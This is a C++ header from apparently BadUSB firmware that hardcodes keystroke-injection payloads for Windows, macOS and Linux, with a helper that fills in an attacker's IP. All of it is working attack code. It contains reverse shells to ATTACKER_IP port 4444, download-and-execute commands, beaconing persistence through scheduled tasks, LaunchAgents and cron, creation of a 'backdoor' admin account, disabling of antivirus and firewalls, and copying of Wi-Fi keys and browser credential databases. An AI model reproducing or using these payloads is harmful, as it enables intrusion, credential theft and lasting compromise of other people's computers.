// badusb_payloads.h — Built-in BadUSB payload library
// No SD card needed — payloads are hardcoded for Windows, Mac, Linux
#pragma once

enum class PayloadOS : uint8_t { WINDOWS = 0, MAC, LINUX, COUNT };
enum class PayloadType : uint8_t {
    WIFI_PASSWORDS = 0,
    SYSTEM_INFO,
    REVERSE_SHELL,
    CREATE_ADMIN,
    DISABLE_AV,
    DOWNLOAD_EXEC,
    EXFIL_BROWSER,
    PERSISTENCE,
    BACK,
    COUNT
};

// Payloads that need an attacker IP
static bool payloadNeedsIP(PayloadType t) {
    return t == PayloadType::REVERSE_SHELL || t == PayloadType::DOWNLOAD_EXEC || t == PayloadType::PERSISTENCE;
}

// Replace ATTACKER_IP in a payload string with the actual IP
static String payloadWithIP(const char* script, const char* ip) {
    String s(script);
    s.replace("ATTACKER_IP", ip);
    return s;
}

static const char* PAYLOAD_OS_NAMES[] = { "WINDOWS", "MAC", "LINUX" };

static const char* PAYLOAD_NAMES[] = {
    "WIFI PASSWORDS",
    "SYSTEM INFO",
    "REVERSE SHELL",
    "CREATE ADMIN USER",
    "DISABLE ANTIVIRUS",
    "DOWNLOAD & EXECUTE",
    "BROWSER CREDS",
    "PERSISTENCE",
    "< BACK"
};

// Each payload is a series of lines. Lines starting with:
//   CMD:  — type this command
//   DELAY: — wait N milliseconds
//   GUI: — press GUI+char
//   ENTER — press enter

// =============================================================================
// WINDOWS PAYLOADS
// =============================================================================

static const char* WIN_WIFI_PASSWORDS =
    "GUI:r\n"
    "DELAY:800\n"
    "CMD:powershell -WindowStyle Hidden -Command \""
    "netsh wlan show profiles | Select-String 'All User' | "
    "ForEach { $n=($_ -split ':')[1].Trim(); "
    "$p=(netsh wlan show profile name=$n key=clear | Select-String 'Key Content').ToString().Split(':')[1].Trim(); "
    "Write-Output \\\"$n : $p\\\" } | Out-File $env:TEMP\\wifi_pass.txt; "
    "notepad $env:TEMP\\wifi_pass.txt\"\n"
    "ENTER\n";

static const char* WIN_SYSTEM_INFO =
    "GUI:r\n"
    "DELAY:800\n"
    "CMD:powershell -WindowStyle Hidden -Command \""
    "$o=@(); "
    "$o+='=== HOSTNAME ==='; $o+=hostname; "
    "$o+='=== IP CONFIG ==='; $o+=ipconfig /all; "
    "$o+='=== USERS ==='; $o+=net user; "
    "$o+='=== ADMIN GROUP ==='; $o+=net localgroup administrators; "
    "$o+='=== ARP TABLE ==='; $o+=arp -a; "
    "$o+='=== NETSTAT ==='; $o+=netstat -ano | select -first 50; "
    "$o+='=== INSTALLED APPS ==='; $o+=Get-WmiObject Win32_Product | select Name | select -first 30; "
    "$o | Out-File $env:TEMP\\sysinfo.txt; "
    "notepad $env:TEMP\\sysinfo.txt\"\n"
    "ENTER\n";

static const char* WIN_REVERSE_SHELL =
    "GUI:r\n"
    "DELAY:800\n"
    "CMD:powershell -WindowStyle Hidden -Command \""
    "$c=New-Object Net.Sockets.TCPClient('ATTACKER_IP',4444); "
    "$s=$c.GetStream(); "
    "$w=New-Object IO.StreamWriter($s); "
    "$w.AutoFlush=$true; "
    "$b=New-Object Byte[] 1024; "
    "while(($i=$s.Read($b,0,$b.Length)) -ne 0){ "
    "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i); "
    "$r=(iex $d 2>&1 | Out-String); "
    "$w.Write($r) }; "
    "$c.Close()\"\n"
    "ENTER\n";

static const char* WIN_CREATE_ADMIN =
    "GUI:r\n"
    "DELAY:800\n"
    "CMD:powershell -WindowStyle Hidden -Command \"Start-Process cmd -Verb RunAs -ArgumentList '/c net user backdoor P@ss123! /add && net localgroup administrators backdoor /add'\"\n"
    "ENTER\n"
    "DELAY:2000\n"
    "ENTER\n";

static const char* WIN_DISABLE_AV =
    "GUI:r\n"
    "DELAY:800\n"
    "CMD:powershell -WindowStyle Hidden -Command \"Start-Process powershell -Verb RunAs -ArgumentList '-Command Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true'\"\n"
    "ENTER\n"
    "DELAY:2000\n"
    "ENTER\n";

static const char* WIN_DOWNLOAD_EXEC =
    "GUI:r\n"
    "DELAY:800\n"
    "CMD:powershell -WindowStyle Hidden -Command \""
    "Invoke-WebRequest -Uri 'http://ATTACKER_IP/payload.exe' "
    "-OutFile $env:TEMP\\update.exe; "
    "Start-Process $env:TEMP\\update.exe\"\n"
    "ENTER\n";

static const char* WIN_BROWSER_CREDS =
    "GUI:r\n"
    "DELAY:800\n"
    "CMD:powershell -WindowStyle Hidden -Command \""
    "$b=[Environment]::GetFolderPath('LocalApplicationData'); "
    "$c=\\\"$b\\Google\\Chrome\\User Data\\Default\\Login Data\\\"; "
    "$e=\\\"$b\\Microsoft\\Edge\\User Data\\Default\\Login Data\\\"; "
    "Copy-Item $c $env:TEMP\\chrome_logins.db -EA 0; "
    "Copy-Item $e $env:TEMP\\edge_logins.db -EA 0; "
    "Write-Output 'Browser DBs copied to TEMP' | Out-File $env:TEMP\\browser_done.txt; "
    "notepad $env:TEMP\\browser_done.txt\"\n"
    "ENTER\n";

static const char* WIN_PERSISTENCE =
    "GUI:r\n"
    "DELAY:800\n"
    "CMD:powershell -WindowStyle Hidden -Command \""
    "$a='powershell -WindowStyle Hidden -Command \\\"IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER_IP/beacon.ps1'')\\\"'; "
    "schtasks /create /tn 'WindowsUpdate' /tr $a /sc onlogon /rl highest /f\"\n"
    "ENTER\n";

// =============================================================================
// MAC PAYLOADS
// =============================================================================

static const char* MAC_WIFI_PASSWORDS =
    "GUI:SPACE\n"
    "DELAY:500\n"
    "CMD:Terminal\n"
    "ENTER\n"
    "DELAY:1000\n"
    "CMD:security find-generic-password -ga \"$(networksetup -getairportnetwork en0 | cut -d: -f2 | tr -d ' ')\" 2>&1 | grep password > /tmp/wifi_pass.txt; open /tmp/wifi_pass.txt\n"
    "ENTER\n";

static const char* MAC_SYSTEM_INFO =
    "GUI:SPACE\n"
    "DELAY:500\n"
    "CMD:Terminal\n"
    "ENTER\n"
    "DELAY:1000\n"
    "CMD:echo '=== HOSTNAME ===' > /tmp/sysinfo.txt; hostname >> /tmp/sysinfo.txt; echo '=== IP ===' >> /tmp/sysinfo.txt; ifconfig >> /tmp/sysinfo.txt; echo '=== USERS ===' >> /tmp/sysinfo.txt; dscl . list /Users | grep -v '_' >> /tmp/sysinfo.txt; echo '=== ARP ===' >> /tmp/sysinfo.txt; arp -a >> /tmp/sysinfo.txt; open /tmp/sysinfo.txt\n"
    "ENTER\n";

static const char* MAC_REVERSE_SHELL =
    "GUI:SPACE\n"
    "DELAY:500\n"
    "CMD:Terminal\n"
    "ENTER\n"
    "DELAY:1000\n"
    "CMD:bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &\n"
    "ENTER\n";

static const char* MAC_CREATE_ADMIN =
    "GUI:SPACE\n"
    "DELAY:500\n"
    "CMD:Terminal\n"
    "ENTER\n"
    "DELAY:1000\n"
    "CMD:sudo dscl . -create /Users/backdoor; sudo dscl . -create /Users/backdoor UserShell /bin/bash; sudo dscl . -create /Users/backdoor UniqueID 599; sudo dscl . -create /Users/backdoor PrimaryGroupID 80; sudo dscl . -passwd /Users/backdoor 'P@ss123!'; sudo dscl . -append /Groups/admin GroupMembership backdoor\n"
    "ENTER\n";

static const char* MAC_DISABLE_AV =
    "GUI:SPACE\n"
    "DELAY:500\n"
    "CMD:Terminal\n"
    "ENTER\n"
    "DELAY:1000\n"
    "CMD:sudo spctl --master-disable; sudo defaults write com.apple.LaunchServices LSQuarantine -bool NO\n"
    "ENTER\n";

static const char* MAC_DOWNLOAD_EXEC =
    "GUI:SPACE\n"
    "DELAY:500\n"
    "CMD:Terminal\n"
    "ENTER\n"
    "DELAY:1000\n"
    "CMD:curl -s http://ATTACKER_IP/payload.sh -o /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh &\n"
    "ENTER\n";

static const char* MAC_BROWSER_CREDS =
    "GUI:SPACE\n"
    "DELAY:500\n"
    "CMD:Terminal\n"
    "ENTER\n"
    "DELAY:1000\n"
    "CMD:cp ~/Library/Application\\ Support/Google/Chrome/Default/Login\\ Data /tmp/chrome_logins.db 2>/dev/null; cp ~/Library/Application\\ Support/Firefox/Profiles/*/logins.json /tmp/ff_logins.json 2>/dev/null; echo 'Done' > /tmp/browser_done.txt; open /tmp/browser_done.txt\n"
    "ENTER\n";

static const char* MAC_PERSISTENCE =
    "GUI:SPACE\n"
    "DELAY:500\n"
    "CMD:Terminal\n"
    "ENTER\n"
    "DELAY:1000\n"
    "CMD:echo '#!/bin/bash' > ~/.config/autostart.sh; echo 'curl -s http://ATTACKER_IP/beacon.sh | bash &' >> ~/.config/autostart.sh; chmod +x ~/.config/autostart.sh; echo '{\"Label\":\"com.user.update\",\"ProgramArguments\":[\"/bin/bash\",\"-c\",\"~/.config/autostart.sh\"],\"RunAtLoad\":true}' > ~/Library/LaunchAgents/com.user.update.plist\n"
    "ENTER\n";

// =============================================================================
// LINUX PAYLOADS
// =============================================================================

static const char* LIN_WIFI_PASSWORDS =
    "CTRL:ALT:t\n"
    "DELAY:1000\n"
    "CMD:sudo grep -r psk= /etc/NetworkManager/system-connections/ 2>/dev/null > /tmp/wifi_pass.txt; cat /tmp/wifi_pass.txt\n"
    "ENTER\n";

static const char* LIN_SYSTEM_INFO =
    "CTRL:ALT:t\n"
    "DELAY:1000\n"
    "CMD:echo '=== HOSTNAME ===' > /tmp/sysinfo.txt; hostname >> /tmp/sysinfo.txt; echo '=== IP ===' >> /tmp/sysinfo.txt; ip a >> /tmp/sysinfo.txt; echo '=== USERS ===' >> /tmp/sysinfo.txt; cat /etc/passwd | grep -v nologin >> /tmp/sysinfo.txt; echo '=== ARP ===' >> /tmp/sysinfo.txt; arp -a >> /tmp/sysinfo.txt; echo '=== NETSTAT ===' >> /tmp/sysinfo.txt; ss -tulpn >> /tmp/sysinfo.txt; cat /tmp/sysinfo.txt\n"
    "ENTER\n";

static const char* LIN_REVERSE_SHELL =
    "CTRL:ALT:t\n"
    "DELAY:1000\n"
    "CMD:bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1 &\n"
    "ENTER\n";

static const char* LIN_CREATE_ADMIN =
    "CTRL:ALT:t\n"
    "DELAY:1000\n"
    "CMD:sudo useradd -m -s /bin/bash -G sudo backdoor; echo 'backdoor:P@ss123!' | sudo chpasswd\n"
    "ENTER\n";

static const char* LIN_DISABLE_AV =
    "CTRL:ALT:t\n"
    "DELAY:1000\n"
    "CMD:sudo systemctl stop apparmor 2>/dev/null; sudo ufw disable 2>/dev/null; sudo iptables -F 2>/dev/null; echo 'Defenses disabled'\n"
    "ENTER\n";

static const char* LIN_DOWNLOAD_EXEC =
    "CTRL:ALT:t\n"
    "DELAY:1000\n"
    "CMD:curl -s http://ATTACKER_IP/payload.sh -o /tmp/update.sh && chmod +x /tmp/update.sh && /tmp/update.sh &\n"
    "ENTER\n";

static const char* LIN_BROWSER_CREDS =
    "CTRL:ALT:t\n"
    "DELAY:1000\n"
    "CMD:cp ~/.config/google-chrome/Default/Login\\ Data /tmp/chrome_logins.db 2>/dev/null; cp ~/.mozilla/firefox/*.default*/logins.json /tmp/ff_logins.json 2>/dev/null; echo 'Browser DBs copied to /tmp' && ls -la /tmp/*login* /tmp/*ff_*\n"
    "ENTER\n";

static const char* LIN_PERSISTENCE =
    "CTRL:ALT:t\n"
    "DELAY:1000\n"
    "CMD:echo '*/5 * * * * curl -s http://ATTACKER_IP/beacon.sh | bash' | crontab -; echo 'Persistence installed'\n"
    "ENTER\n";

// Lookup table [OS][PayloadType]
static const char* PAYLOAD_TABLE[3][8] = {
    // WINDOWS
    { WIN_WIFI_PASSWORDS, WIN_SYSTEM_INFO, WIN_REVERSE_SHELL, WIN_CREATE_ADMIN,
      WIN_DISABLE_AV, WIN_DOWNLOAD_EXEC, WIN_BROWSER_CREDS, WIN_PERSISTENCE },
    // MAC
    { MAC_WIFI_PASSWORDS, MAC_SYSTEM_INFO, MAC_REVERSE_SHELL, MAC_CREATE_ADMIN,
      MAC_DISABLE_AV, MAC_DOWNLOAD_EXEC, MAC_BROWSER_CREDS, MAC_PERSISTENCE },
    // LINUX
    { LIN_WIFI_PASSWORDS, LIN_SYSTEM_INFO, LIN_REVERSE_SHELL, LIN_CREATE_ADMIN,
      LIN_DISABLE_AV, LIN_DOWNLOAD_EXEC, LIN_BROWSER_CREDS, LIN_PERSISTENCE },
};
